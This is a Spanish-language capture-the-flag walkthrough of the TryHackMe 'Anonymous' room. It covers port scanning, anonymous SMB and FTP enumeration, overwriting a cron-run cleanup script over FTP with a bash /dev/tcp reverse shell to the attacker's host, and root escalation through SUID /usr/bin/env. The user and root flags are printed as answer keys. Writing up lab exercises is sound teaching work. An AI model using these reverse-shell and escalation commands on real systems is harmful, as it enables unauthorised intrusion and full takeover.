# Anonymous

### tags: `Try Hack Me` `Linux` `SMB` `SUID` `FTP`

## **FLAGS:**

* User Flag: 90d6f992585815ff991e68748c414740
* Root Flag: 4d930091c31a622a7ed10f27999af363

## **USERS:**

* namelessone
* Tatyana Panova

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/U7zeqf4.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 21 \(FTP\), 22 \(SSH\) y 139 y 445 \(SMB\)

       ![](https://i.imgur.com/n9t5ik5.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p21,22,139,445 IP`

   ![](https://i.imgur.com/ZQRXhT2.png)

4. Vemos que tiene un puerto SMB abierto. Vamos a enumerarlo. Primero usamos un script de nmap:

   `nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse IP`

   ![](https://i.imgur.com/jcvpPYy.png)

   * Podemos usar también smbclient para listar las unidades compartidas de forma anónima:

     `smbclient -L \\IP -N`

     ![](https://i.imgur.com/BixTCOB.png)

5. Vemos un Disco compartido "pics". Vemos que esta compartido sobre el directorio home de **namelessone**.

   Tenemos un posible usuario: **namelessone**

   * Probamos a conectarnos:

     `smbclient //IP/pics`

     ![](https://i.imgur.com/IgoRbpO.png)

   * Vemos 2 imágenes. Las descargamos de forma recursiva:

     `smbget -R smb://IP/pics`

     ![](https://i.imgur.com/ng1RUy9.png)

   * Observamos las imágenes pero no hay nada raro. Hacemos un poco de stego. Con exiftool vemos las cabeceras de las imágenes. En una de ellas encontramos un posible usuario:

     ![](https://i.imgur.com/75jaLkM.png)

     Tenemos un posible usuario: **Tatyana Panova**

6. Vamos a ver el servicio FTP. NMAP nos dice que tiene login anónimo con usuario ftp. Nos conectamos y vemos un directorio scripts, con 3 ficheros.

   ![](https://i.imgur.com/6r6vhec.png)

   * Descargamos los 3 ficheros con `mget FILE1 FILE2 FILE3`

     ![](https://i.imgur.com/v422nY0.png)

7. Vamos a observar los 3 ficheros en nuestra máquina:

   ![](https://i.imgur.com/dHQfYs8.png)

   * Vemos un script de limpieza que elimina los ficheros indicados en `tmp_files`. Borra los ficheros de /tmp.

8. Viendo los logs, parece un script que se ejecuta de forma periódica con algún cron. Si conseguimos modificarlo, podemos hacer que se ejecute otra cosa, con los permisos del usuario con el que se ejecuta el script. Podríamos levantar una shell reversa.
   * Vemos que tenemos permisos de edición sobre el fichero:

     ![](https://i.imgur.com/nE1l3wO.png)

   * Viendo las fechas del log, parece que se ejecuta cada minuto

     ![](https://i.imgur.com/bieI3kz.png)

## **GET A SHELL**

Vamos a intentar cambiar el script para que ejecute una shell reversa, siguiendo [este Cheat-Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

* Levantamos un puerto en escucha en nuestro Kali:

  `nc -lvp 8433`

* En local, editamos el script clean.sh para que contenga lo siguiente:

  `/bin/bash -l > /dev/tcp/IP_LOCAL/8443 0<&1 2\&1`

  ![](https://i.imgur.com/uNK5kQn.png)

* Subimos al server el script por FTP:

  `put SCRIPT`

  ![](https://i.imgur.com/Ow1EiJE.png)

* Conseguimos una Shell en el servidor como el usuario namelessone, que habiamos visto antes al listar los SMB con el recurso pics.

  ![](https://i.imgur.com/R7sFtSW.png)

* Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:
  1. python -c 'import pty; pty.spawn\("/bin/bash"\)'
  2. script /dev/null -c bash
  3. CTRL + Z
  4. stty raw -echo
  5. fg
  6. reset
  7. xterm
  8. export TERM=xterm
  9. export SHELL=bash
  10. stty -a
  11. stty rows _NumRows_ columns _NumCols_

      _Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa_

## **USER FLAG**

Estamos en el directorio home de **namelessone**. Al listar el contenido vemos la flag user.txt.

![](https://i.imgur.com/zJ2O3Pl.png)

Tenemos la user flag: **90d6f992585815ff991e68748c414740**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)

1. En primer lugar, intentamos ver los privilegios de sudo del usuario namelessone. No puede ejecutar el comando `sudo -l` al no saber la password.
2. Buscamos los ficheros con el SUID activo

   `find / -user root -perm -4000 2>/dev/null`

   ![](https://i.imgur.com/AgvrsB3.png)

   * Podemos buscar en esta [guía](https://gtfobins.github.io/) alguno que nos llame la atención

3. Tras un rato de búsqueda, encontramos el binario **/usr/bin/env**, que se puede explotar vía SUID:

   ![](https://i.imgur.com/l0gkqT8.png)

   * Ejecutamos lo siguiente:

     `/usr/bin/env /bin/sh -p`

     ![](https://i.imgur.com/ZtxxsYZ.png)

4. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

   Tenemos la root flag: **4d930091c31a622a7ed10f27999af363**

